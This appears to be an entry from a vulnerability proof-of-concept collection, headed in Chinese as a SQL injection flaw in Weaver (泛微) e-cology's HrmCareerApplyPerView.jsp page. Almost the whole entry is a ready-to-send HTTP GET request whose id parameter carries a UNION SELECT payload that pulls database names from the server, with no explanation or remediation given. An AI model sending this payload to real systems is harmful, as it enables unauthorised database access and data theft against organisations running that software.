## 泛微 HrmCareerApplyPerView sql注入漏洞
```
GET
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
Accept-Encoding: gzip, deflate
Connection: close

```
